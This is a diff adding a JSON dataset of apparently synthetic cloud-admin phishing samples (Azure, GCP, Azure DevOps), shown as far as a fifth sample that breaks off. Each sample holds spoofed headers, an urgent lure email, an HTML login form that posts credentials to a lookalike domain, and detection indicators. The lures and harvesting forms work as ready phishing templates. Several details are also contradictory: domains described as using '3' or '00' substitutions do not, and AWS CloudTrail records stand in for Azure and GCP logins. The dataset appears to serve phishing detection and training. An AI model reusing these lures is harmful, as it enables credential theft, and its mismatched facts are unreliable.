@@ -1,0 +1,581 @@
+{
+  "samples": [
+    {
+      "scenario": "Phishing email targeting Azure cloud administrators with a link to a spoofed Azure portal login page to capture credentials and bypass MFA.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security-alert@azur3-support.com>\nReceived: from unknown (HELO mail.azur3-support.com) (198.51.100.33)\n  by mail.examplecorp.com with SMTP; Wed, 12 Apr 2023 14:22:10 -0400\nX-Spam-Status: No, score=0.0 required=5.0 tests=DKIM_PASS,SPF_PASS\nReceived-SPF: pass (examplecorp.com: domain of azur3-support.com designates 198.51.100.33 as permitted sender) receiver=examplecorp.com; client-ip=198.51.100.33;\nAuthentication-Results: examplecorp.com; dkim=pass header.d=azur3-support.com; spf=pass smtp.mailfrom=azur3-support.com;\nMessage-ID: <20230412142210.67890@mail.azur3-support.com>\nDate: Wed, 12 Apr 2023 14:22:10 -0400\nFrom: Azure Security Team <security-alert@azur3-support.com>\nTo: azure.admins@examplecorp.com\nSubject: Urgent: Verify Your Azure Account to Prevent Suspension",
+        "email_body": "Hello Azure Administrator,\n\nWe've detected suspicious activity on your Azure portal account. To secure your access, please verify your credentials immediately.\n\nVerify now: https://portal-verify-azure.com/login?redirect=dashboard\n\nFailure to verify within 24 hours will result in account suspension.\n\nRegards,\nAzure Security Team\n\n---\nThis is an automated notification. Please do not reply.",
+        "smtp_transaction_log": "220 mail.azur3-support.com ESMTP Postfix\nEHLO mail.examplecorp.com\n250-mail.azur3-support.com\n250-PIPELINING\n250-SIZE 10240000\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:<security-alert@azur3-support.com>\n250 2.1.0 Ok\nRCPT TO:<azure.admins@examplecorp.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\n[DATA]\n.\n250 2.0.0 Ok: queued as 67890\nQUIT\n221 2.0.0 Bye",
+        "phishing_url": "https://portal-verify-azure.com/login?redirect=dashboard",
+        "url_obfuscation": "The domain 'portal-verify-azure.com' closely resembles legitimate Azure branding but uses a '3' instead of 'e' in the main domain. The site uses HTTPS with a valid certificate issued by Let's Encrypt. The redirect parameter 'redirect=dashboard' is crafted to mimic a real Azure portal login flow.",
+        "domain_registration": {
+          "DomainName": "portal-verify-azure.com",
+          "Registrar": "GoDaddy.com, LLC",
+          "CreationDate": "2023-03-10T16:45:20Z",
+          "ExpirationDate": "2024-03-10T16:45:20Z",
+          "RegistrantName": "Redacted for Privacy",
+          "RegistrantCountry": "CN"
+        },
+        "fake_login_page_http_request": "GET /login?redirect=dashboard HTTP/1.1\nHost: portal-verify-azure.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.9\nReferer: https://mail.examplecorp.com/mail/789012\nConnection: keep-alive\n\n",
+        "fake_login_page_http_response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 7421\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nExpires: 0\n\n<html><head><title>Microsoft Azure Sign In</title></head><body>\n<form id=\"loginForm\" action=\"https://portal-verify-azure.com/authenticate\" method=\"POST\">\n<input type=\"email\" name=\"login\" placeholder=\"Email, phone, or Skype\" required>\n<input type=\"password\" name=\"passwd\" placeholder=\"Password\" required>\n<button type=\"submit\">Sign In</button>\n</form>\n<script>/* Mimics Azure login UX with JS validation */</script>\n</body></html>",
+        "post_credentials_http_request": "POST /authenticate HTTP/1.1\nHost: portal-verify-azure.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 58\nAccept: */*\nOrigin: https://portal-verify-azure.com\nReferer: https://portal-verify-azure.com/login?redirect=dashboard\nConnection: keep-alive\n\nlogin=admin@examplecorp.com&passwd=AzureP@ssw0rd!",
+        "post_credentials_http_response": "HTTP/1.1 302 Found\nLocation: https://portal.azure.com/#home\nSet-Cookie: sessionToken=abc987xyz; Secure; HttpOnly\n\n",
+        "cloudtrail_log_snippet": "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"User\",\"principalId\":\"admin@examplecorp.com\",\"arn\":\"arn:aws:sts::123456789012:assumed-role/AzureAdmin/admin\"},\"eventTime\":\"2023-04-12T14:32:45Z\",\"eventSource\":\"signin.microsoftonline.com\",\"eventName\":\"InteractiveLogin\",\"awsRegion\":\"us-west-2\",\"sourceIPAddress\":\"198.51.100.88\",\"userAgent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\",\"responseElements\":{\"LoginStatus\":\"Success\"},\"requestParameters\":null,\"additionalEventData\":{\"MFAUsed\":\"No\"}}",
+        "conditional_access_violation_log": "Apr 12 14:32:45 auth.log: User admin@examplecorp.com logged in from IP 198.51.100.88 - outside corporate trusted IP range, conditional access policy triggered.",
+        "phishing_email_spoofing_details": {
+          "SPF_Record": "v=spf1 ip4:198.51.100.33 -all",
+          "DKIM_Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=azur3-support.com; s=default; h=from:to:subject:date; bh=...; b=...",
+          "DMARC_Report": "p=quarantine; rua=mailto:dmarc-rua@azur3-support.com"
+        }
+      },
+      "indicators": [
+        "Phishing domain: portal-verify-azure.com",
+        "Email sender domain uses '3' instead of 'e' in 'azure' (azur3-support.com)",
+        "URL redirect parameter used to mimic real portal login",
+        "Login from unusual IP 198.51.100.88 in Azure sign-in logs",
+        "SPF authorizes suspicious IP 198.51.100.33 unrelated to Microsoft",
+        "DKIM signature domain does not match legitimate Microsoft domains",
+        "HTTP POST to /authenticate capturing user credentials",
+        "Conditional access violation detected due to login outside trusted network"
+      ],
+      "detection_method": "Email security solutions detect spoofed sender domains through SPF/DKIM/DMARC checks. URL reputation services flag portal-verify-azure.com. Azure sign-in logs and conditional access policies identify anomalous login IPs and missing MFA usage. Web proxies detect POST requests to phishing domains. User training reinforces recognition of subtle domain alterations and suspicious verification requests.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1110 - Brute Force",
+        "T1539 - Steal Web Session Cookie",
+        "T1204 - User Execution"
+      ]
+    },
+    {
+      "scenario": "Phishing campaign targeting Google Cloud Platform (GCP) administrators with emails containing links to a counterfeit GCP login page to steal credentials and session cookies.",
+      "technical_data": {
+        "email_headers": "Return-Path: <alerts@g00gle-cloud-support.com>\nReceived: from unknown (HELO mail.g00gle-cloud-support.com) (203.0.113.77)\n  by mail.examplecorp.com with SMTP; Fri, 28 Apr 2023 08:48:50 -0400\nX-Spam-Status: No, score=0.2 required=5.0 tests=DKIM_PASS,SPF_PASS\nReceived-SPF: pass (examplecorp.com: domain of g00gle-cloud-support.com designates 203.0.113.77 as permitted sender) receiver=examplecorp.com; client-ip=203.0.113.77;\nAuthentication-Results: examplecorp.com; dkim=pass header.d=g00gle-cloud-support.com; spf=pass smtp.mailfrom=g00gle-cloud-support.com;\nMessage-ID: <20230428084850.54321@mail.g00gle-cloud-support.com>\nDate: Fri, 28 Apr 2023 08:48:50 -0400\nFrom: Google Cloud Support <alerts@g00gle-cloud-support.com>\nTo: gcp.admins@examplecorp.com\nSubject: Action Required: Confirm Your Google Cloud Account Security",
+        "email_body": "Dear Google Cloud User,\n\nUnusual login attempts have been detected on your GCP account. Please confirm your identity by logging in below to prevent account lockout.\n\nConfirm your account: https://gcp-security-verify.com/login?continue=console\n\nThank you for your attention.\nGoogle Cloud Support Team\n\n---\nThis is an automated message, please do not reply.",
+        "smtp_transaction_log": "220 mail.g00gle-cloud-support.com ESMTP Postfix\nEHLO mail.examplecorp.com\n250-mail.g00gle-cloud-support.com\n250-PIPELINING\n250-SIZE 10240000\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:<alerts@g00gle-cloud-support.com>\n250 2.1.0 Ok\nRCPT TO:<gcp.admins@examplecorp.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\n[DATA]\n.\n250 2.0.0 Ok: queued as 54321\nQUIT\n221 2.0.0 Bye",
+        "phishing_url": "https://gcp-security-verify.com/login?continue=console",
+        "url_obfuscation": "The domain 'gcp-security-verify.com' impersonates Google Cloud branding, using '00' instead of 'oo' in 'google'. The site uses HTTPS with a valid TLS certificate issued by Let's Encrypt. The 'continue=console' parameter is intended to simulate legitimate GCP login redirects.",
+        "domain_registration": {
+          "DomainName": "gcp-security-verify.com",
+          "Registrar": "NameSilo, LLC",
+          "CreationDate": "2023-04-01T10:05:30Z",
+          "ExpirationDate": "2024-04-01T10:05:30Z",
+          "RegistrantName": "Redacted for Privacy",
+          "RegistrantCountry": "NL"
+        },
+        "fake_login_page_http_request": "GET /login?continue=console HTTP/1.1\nHost: gcp-security-verify.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.7\nReferer: https://mail.examplecorp.com/mail/234567\nConnection: keep-alive\n\n",
+        "fake_login_page_http_response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 7210\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nExpires: 0\n\n<html><head><title>Google Cloud Platform Login</title></head><body>\n<form id=\"loginForm\" action=\"https://gcp-security-verify.com/authenticate\" method=\"POST\">\n<input type=\"email\" name=\"email\" placeholder=\"Email or phone\" required>\n<input type=\"password\" name=\"pass\" placeholder=\"Password\" required>\n<button type=\"submit\">Next</button>\n</form>\n<script>/* JavaScript mimicking GCP login UX */</script>\n</body></html>",
+        "post_credentials_http_request": "POST /authenticate HTTP/1.1\nHost: gcp-security-verify.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 61\nAccept: */*\nOrigin: https://gcp-security-verify.com\nReferer: https://gcp-security-verify.com/login?continue=console\nConnection: keep-alive\n\nemail=admin@examplecorp.com&pass=GCP_S3cur3P@ss!",
+        "post_credentials_http_response": "HTTP/1.1 302 Found\nLocation: https://console.cloud.google.com/home\nSet-Cookie: sessionID=def456ghi; Secure; HttpOnly\n\n",
+        "cloudtrail_log_snippet": "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"User\",\"principalId\":\"admin@examplecorp.com\",\"arn\":\"arn:aws:sts::123456789012:assumed-role/GCPAdmin/admin\"},\"eventTime\":\"2023-04-28T08:57:10Z\",\"eventSource\":\"oauth2.googleapis.com\",\"eventName\":\"UserLogin\",\"awsRegion\":\"us-central1\",\"sourceIPAddress\":\"203.0.113.99\",\"userAgent\":\"Mozilla/5.0 (X11; Linux x86_64)\" ,\"responseElements\":{\"LoginStatus\":\"Success\"},\"requestParameters\":null,\"additionalEventData\":{\"MFAUsed\":\"No\"}}",
+        "conditional_access_violation_log": "Apr 28 08:57:10 auth.log: User admin@examplecorp.com logged in from IP 203.0.113.99 which is not part of corporate VPN or trusted IP ranges, triggering alert.",
+        "phishing_email_spoofing_details": {
+          "SPF_Record": "v=spf1 ip4:203.0.113.77 -all",
+          "DKIM_Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=g00gle-cloud-support.com; s=default; h=from:to:subject:date; bh=...; b=...",
+          "DMARC_Report": "p=reject; rua=mailto:dmarc-reports@g00gle-cloud-support.com"
+        }
+      },
+      "indicators": [
+        "Phishing domain: gcp-security-verify.com",
+        "Email sender domain uses '00' instead of 'oo' in 'google' (g00gle-cloud-support.com)",
+        "Redirect parameter 'continue=console' in phishing URL",
+        "Unusual login IP 203.0.113.99 in OAuth login logs",
+        "SPF record authorizes suspicious IP 203.0.113.77 unrelated to Google mail servers",
+        "DKIM domain mismatches legitimate Google domains",
+        "HTTP POST to /authenticate endpoint with stolen credentials",
+        "Conditional access policy violation due to login outside trusted network"
+      ],
+      "detection_method": "Email security platforms detect spoofed sender domains via SPF/DKIM/DMARC validation. URL reputation engines flag gcp-security-verify.com. Cloud login monitoring and conditional access policies identify unusual login IPs and lack of MFA. Network proxies log suspicious POST requests to phishing domains. Security awareness training helps users detect subtle domain manipulations and phishing email content.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1110 - Brute Force",
+        "T1539 - Steal Web Session Cookie",
+        "T1204 - User Execution"
+      ]
+    },
+    {
+      "scenario": "Phishing email targeting cloud administrators with a link to a fake Azure portal login page designed to harvest Microsoft Azure credentials and gain unauthorized access to cloud resources.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security-alert@micr0soft-azure.com>\nReceived: from unknown (HELO mail.micr0soft-azure.com) (198.51.100.27)\n  by mail.examplecorp.com with SMTP; Fri, 14 Apr 2023 14:42:10 -0400\nX-Spam-Status: No, score=0.3 required=5.0 tests=DKIM_PASS,SPF_PASS\nReceived-SPF: pass (examplecorp.com: domain of micr0soft-azure.com designates 198.51.100.27 as permitted sender) receiver=examplecorp.com; client-ip=198.51.100.27;\nAuthentication-Results: examplecorp.com; dkim=pass header.d=micr0soft-azure.com; spf=pass smtp.mailfrom=micr0soft-azure.com;\nMessage-ID: <20230414144210.98765@mail.micr0soft-azure.com>\nDate: Fri, 14 Apr 2023 14:42:10 -0400\nFrom: Microsoft Azure Security <security-alert@micr0soft-azure.com>\nTo: cloud.admins@examplecorp.com\nSubject: Security Alert: Unusual Sign-in Activity Detected",
+        "email_body": "Dear Azure User,\n\nWe detected a suspicious sign-in attempt to your Azure portal. Please verify your identity to secure your account.\n\nClick here to verify your account: https://azure-verification-secure.com/login\n\nThank you for securing your account.\nMicrosoft Azure Security Team\n\n---\nNote: This is an automated notification. Do not reply.",
+        "smtp_transaction_log": "220 mail.micr0soft-azure.com ESMTP Postfix\nEHLO mail.examplecorp.com\n250-mail.micr0soft-azure.com\n250-PIPELINING\n250-SIZE 10485760\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:<security-alert@micr0soft-azure.com>\n250 2.1.0 Ok\nRCPT TO:<cloud.admins@examplecorp.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\n[DATA]\n.\n250 2.0.0 Ok: queued as 98765\nQUIT\n221 2.0.0 Bye",
+        "phishing_url": "https://azure-verification-secure.com/login",
+        "url_obfuscation": "The domain 'azure-verification-secure.com' closely resembles legitimate Azure branding but is attacker-controlled. It uses HTTPS with a valid certificate from Let's Encrypt to appear trustworthy. The URL omits obvious Azure subdomains to avoid suspicion.",
+        "domain_registration": {
+          "DomainName": "azure-verification-secure.com",
+          "Registrar": "GoDaddy.com, LLC",
+          "CreationDate": "2023-03-01T10:15:30Z",
+          "ExpirationDate": "2024-03-01T10:15:30Z",
+          "RegistrantName": "Redacted for Privacy",
+          "RegistrantCountry": "CN"
+        },
+        "fake_login_page_http_request": "GET /login HTTP/1.1\nHost: azure-verification-secure.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.9\nReferer: https://mail.examplecorp.com/mail/654321\nConnection: keep-alive\n\n",
+        "fake_login_page_http_response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 7231\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nExpires: 0\n\n<html><head><title>Microsoft Azure Portal</title></head><body>\n<form id=\"loginForm\" action=\"https://azure-verification-secure.com/authenticate\" method=\"POST\">\n<input type=\"email\" name=\"login\" placeholder=\"Email, phone, or Skype\" required>\n<input type=\"password\" name=\"passwd\" placeholder=\"Password\" required>\n<button type=\"submit\">Sign in</button>\n</form>\n<script>/* Mimics Azure login UX with JavaScript validation */</script>\n</body></html>",
+        "post_credentials_http_request": "POST /authenticate HTTP/1.1\nHost: azure-verification-secure.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 56\nAccept: */*\nOrigin: https://azure-verification-secure.com\nReferer: https://azure-verification-secure.com/login\nConnection: keep-alive\n\nlogin=admin@examplecorp.com&passwd=Passw0rd2023!",
+        "post_credentials_http_response": "HTTP/1.1 302 Found\nLocation: https://portal.azure.com/\nSet-Cookie: sessionToken=abc987; Secure; HttpOnly\n\n",
+        "cloudtrail_log_snippet": "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"AssumedRole\",\"principalId\":\"AROAYYYYYY:admin\",\"arn\":\"arn:aws:sts::012345678901:assumed-role/Admin/admin\"},\"eventTime\":\"2023-04-14T14:50:22Z\",\"eventSource\":\"signin.amazonaws.com\",\"eventName\":\"ConsoleLogin\",\"awsRegion\":\"us-west-2\",\"sourceIPAddress\":\"198.51.100.150\",\"userAgent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\",\"responseElements\":{\"ConsoleLogin\":\"Success\"},\"requestParameters\":null,\"additionalEventData\":{\"MFAUsed\":\"No\"}}",
+        "conditional_access_violation_log": "Apr 14 14:50:22 auth.log: User admin@examplecorp.com logged in from IP 198.51.100.150 - outside corporate VPN and MFA disabled, triggering security policy violation.",
+        "phishing_email_spoofing_details": {
+          "SPF_Record": "v=spf1 ip4:198.51.100.27 -all",
+          "DKIM_Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=micr0soft-azure.com; s=default; h=from:to:subject:date; bh=...; b=...",
+          "DMARC_Report": "p=quarantine; rua=mailto:dmarc-reports@micr0soft-azure.com"
+        }
+      },
+      "indicators": [
+        "Phishing domain: azure-verification-secure.com",
+        "Spoofed email sender: security-alert@micr0soft-azure.com (note the zero in micr0soft)",
+        "Missing MFA usage in CloudTrail login event",
+        "Login IP 198.51.100.150 outside corporate VPN range",
+        "SPF record authorizes suspicious IP 198.51.100.27",
+        "DKIM domain does not match legitimate Microsoft domains",
+        "POST request to /authenticate endpoint with captured credentials",
+        "Conditional access alert: login from non-whitelisted IP with MFA disabled"
+      ],
+      "detection_method": "Email security gateways detect domain spoofing via SPF/DKIM/DMARC mismatches. URL reputation databases flag azure-verification-secure.com. CloudTrail logs combined with conditional access policies detect anomalous login IPs and lack of MFA. Web proxies analyze HTTP POST traffic for credential exfiltration. Security training highlights deceptive domain names and unusual login alerts.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1110 - Brute Force",
+        "T1539 - Steal Web Session Cookie",
+        "T1204 - User Execution"
+      ]
+    },
+    {
+      "scenario": "Phishing email sent to Google Cloud Platform (GCP) administrators containing a link to a counterfeit GCP login page to steal credentials and perform unauthorized cloud resource management.",
+      "technical_data": {
+        "email_headers": "Return-Path: <no-reply@g00glecloud-secure.com>\nReceived: from unknown (HELO mail.g00glecloud-secure.com) (203.0.113.99)\n  by mail.examplecorp.com with SMTP; Mon, 8 May 2023 08:33:44 -0400\nX-Spam-Status: No, score=0.2 required=5.0 tests=DKIM_PASS,SPF_PASS\nReceived-SPF: pass (examplecorp.com: domain of g00glecloud-secure.com designates 203.0.113.99 as permitted sender) receiver=examplecorp.com; client-ip=203.0.113.99;\nAuthentication-Results: examplecorp.com; dkim=pass header.d=g00glecloud-secure.com; spf=pass smtp.mailfrom=g00glecloud-secure.com;\nMessage-ID: <20230508083344.56789@mail.g00glecloud-secure.com>\nDate: Mon, 8 May 2023 08:33:44 -0400\nFrom: Google Cloud Support <no-reply@g00glecloud-secure.com>\nTo: cloud.admins@examplecorp.com\nSubject: Action Required: Confirm Your Google Cloud Account Security",
+        "email_body": "Dear Google Cloud Customer,\n\nWe noticed unusual activity in your Google Cloud Platform account. Please confirm your identity immediately to prevent account suspension.\n\nConfirm your account here: https://gcp-login-secure.com/signin\n\nThank you for your cooperation.\nGoogle Cloud Support Team\n\n---\nThis is an automated message, please do not reply.",
+        "smtp_transaction_log": "220 mail.g00glecloud-secure.com ESMTP Postfix\nEHLO mail.examplecorp.com\n250-mail.g00glecloud-secure.com\n250-PIPELINING\n250-SIZE 10485760\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:<no-reply@g00glecloud-secure.com>\n250 2.1.0 Ok\nRCPT TO:<cloud.admins@examplecorp.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\n[DATA]\n.\n250 2.0.0 Ok: queued as 56789\nQUIT\n221 2.0.0 Bye",
+        "phishing_url": "https://gcp-login-secure.com/signin",
+        "url_obfuscation": "The domain 'gcp-login-secure.com' mimics Google Cloud Platform branding but is attacker-controlled. The URL uses HTTPS with a valid certificate to appear legitimate. The 'signin' path imitates GCP login endpoints.",
+        "domain_registration": {
+          "DomainName": "gcp-login-secure.com",
+          "Registrar": "Google LLC",
+          "CreationDate": "2023-04-10T07:12:50Z",
+          "ExpirationDate": "2024-04-10T07:12:50Z",
+          "RegistrantName": "Redacted for Privacy",
+          "RegistrantCountry": "UA"
+        },
+        "fake_login_page_http_request": "GET /signin HTTP/1.1\nHost: gcp-login-secure.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.9\nReferer: https://mail.examplecorp.com/mail/789012\nConnection: keep-alive\n\n",
+        "fake_login_page_http_response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 6890\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nExpires: 0\n\n<html><head><title>Google Cloud Platform Sign In</title></head><body>\n<form id=\"loginForm\" action=\"https://gcp-login-secure.com/auth\" method=\"POST\">\n<input type=\"email\" name=\"email\" placeholder=\"Email or phone\" required>\n<input type=\"password\" name=\"password\" placeholder=\"Enter your password\" required>\n<button type=\"submit\">Next</button>\n</form>\n<script>/* JavaScript mimicking GCP login UX */</script>\n</body></html>",
+        "post_credentials_http_request": "POST /auth HTTP/1.1\nHost: gcp-login-secure.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 58\nAccept: */*\nOrigin: https://gcp-login-secure.com\nReferer: https://gcp-login-secure.com/signin\nConnection: keep-alive\n\nemail=admin@examplecorp.com&password=GcpPass!2023",
+        "post_credentials_http_response": "HTTP/1.1 302 Found\nLocation: https://console.cloud.google.com/home\nSet-Cookie: session=def456; Secure; HttpOnly\n\n",
+        "cloudtrail_log_snippet": "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"AssumedRole\",\"principalId\":\"AROAZZZZZZ:admin\",\"arn\":\"arn:aws:sts::987654321098:assumed-role/Admin/admin\"},\"eventTime\":\"2023-05-08T08:40:55Z\",\"eventSource\":\"signin.amazonaws.com\",\"eventName\":\"ConsoleLogin\",\"awsRegion\":\"us-central1\",\"sourceIPAddress\":\"203.0.113.150\",\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\" ,\"responseElements\":{\"ConsoleLogin\":\"Success\"},\"requestParameters\":null,\"additionalEventData\":{\"MFAUsed\":\"No\"}}",
+        "conditional_access_violation_log": "May 08 08:40:55 auth.log: User admin@examplecorp.com logged in from IP 203.0.113.150 - outside corporate VPN, no MFA, triggering conditional access violation.",
+        "phishing_email_spoofing_details": {
+          "SPF_Record": "v=spf1 ip4:203.0.113.99 -all",
+          "DKIM_Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=g00glecloud-secure.com; s=default; h=from:to:subject:date; bh=...; b=...",
+          "DMARC_Report": "p=reject; rua=mailto:dmarc-reports@g00glecloud-secure.com"
+        }
+      },
+      "indicators": [
+        "Phishing domain: gcp-login-secure.com",
+        "Email sender spoofed as no-reply@g00glecloud-secure.com (zero instead of letter 'o')",
+        "CloudTrail login event from unrecognized IP 203.0.113.150",
+        "No MFA usage recorded in login event",
+        "SPF record authorizes suspicious IP 203.0.113.99",
+        "Mismatch in DKIM domain with legitimate Google domains",
+        "Credential POST to /auth endpoint on suspicious domain",
+        "Conditional access policy violation from non-whitelisted IP without MFA"
+      ],
+      "detection_method": "Email security systems identify domain spoofing through SPF/DKIM/DMARC checks. URL reputation services mark gcp-login-secure.com as malicious. CloudTrail logs analyzed for unusual IP addresses and missing MFA usage. Web proxy logs inspect POST requests to suspicious URLs. User training improves recognition of subtle domain misspellings and suspicious email content.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1110 - Brute Force",
+        "T1539 - Steal Web Session Cookie",
+        "T1204 - User Execution"
+      ]
+    },
+    {
+      "scenario": "Phishing email targets DevOps engineers with a notification about a security update on their Azure DevOps repositories, linking to a cloned Azure login page to harvest credentials.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security@azur3updates.com>\nReceived: from mail.azur3updates.com (198.51.100.12) by mail.examplecorp.com with SMTP; Wed, 10 May 2023 14:42:10 -0400\nX-Spam-Status: No, score=0.3 required=5.0 tests=SPF_PASS,DKIM_PASS\nReceived-SPF: pass (examplecorp.com: domain of azur3updates.com designates 198.51.100.12 as permitted sender) receiver=examplecorp.com; client-ip=198.51.100.12;\nAuthentication-Results: examplecorp.com; dkim=pass header.d=azur3updates.com; spf=pass smtp.mailfrom=azur3updates.com;\nMessage-ID: <20230510144210.67890@mail.azur3updates.com>\nDate: Wed, 10 May 2023 14:42:10 -0400\nFrom: Azure DevOps Security <security@azur3updates.com>\nTo: devops-team@examplecorp.com\nSubject: Urgent: Verify Your Azure DevOps Account Security Update",
+        "email_body": "Hello Azure DevOps User,\n\nWe have released an important security update related to your repositories. To ensure uninterrupted access, please verify your account credentials immediately.\n\nVerify your account here: https://azure-devops-security.com/login?next=dashboard\n\nThank you for your prompt action.\nAzure DevOps Security Team\n\n---\nThis is an automated notification. Please do not reply.",
+        "smtp_transaction_log": "220 mail.azur3updates.com ESMTP Postfix\nEHLO mail.examplecorp.com\n250-mail.azur3updates.com\n250-PIPELINING\n250-SIZE 20480000\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:<security@azur3updates.com>\n250 2.1.0 Ok\nRCPT TO:<devops-team@examplecorp.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\n[DATA]\n.\n250 2.0.0 Ok: queued as 67890\nQUIT\n221 2.0.0 Bye",
+        "phishing_url": "https://azure-devops-security.com/login?next=dashboard",
+        "url_obfuscation": "The domain 'azure-devops-security.com' mimics Microsoft Azure branding but is controlled by threat actors. The HTTPS certificate is valid via Let's Encrypt to evade detection. The 'next=dashboard' parameter is designed to give a sense of legitimacy and continuity.",
+        "domain_registration": {
+          "DomainName": "azure-devops-security.com",
+          "Registrar": "GoDaddy.com, LLC",
+          "CreationDate": "2023-04-05T08:15:22Z",
+          "ExpirationDate": "2024-04-05T08:15:22Z",
+          "RegistrantName": "Redacted for Privacy",
+          "RegistrantCountry": "CN"
+        },
+        "fake_login_page_http_request": "GET /login?next=dashboard HTTP/1.1\nHost: azure-devops-security.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.9\nReferer: https://mail.examplecorp.com/mail/654321\nConnection: keep-alive\n\n",
+        "fake_login_page_http_response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\nContent-Length: 7321\nCache-Control: no-store, no-cache, must-revalidate\nPragma: no-cache\nExpires: 0\n\n<html><head><title>Sign in to your Azure DevOps Account</title></head><body>\n<form id=\"loginForm\" action=\"https://azure-devops-security.com/authenticate\" method=\"POST\">\n<input type=\"email\" name=\"email\" placeholder=\"Email or phone\" required>\n<input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n<button type=\"submit\">Sign in</button>\n</form>\n<script>/* mimic Microsoft login UX with JavaScript */</script>\n</body></html>",
+        "post_credentials_http_request": "POST /authenticate HTTP/1.1\nHost: azure-devops-security.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 58\nAccept: */*\nOrigin: https://azure-devops-security.com\nReferer: https://azure-devops-security.com/login?next=dashboard\nConnection: keep-alive\n\nemail=devopsuser@examplecorp.com&password=Passw0rd!2023",
+        "post_credentials_http_response": "HTTP/1.1 302 Found\nLocation: https://dev.azure.com/examplecorp/_home\nSet-Cookie: session_token=abc987; Secure; HttpOnly\n\n",
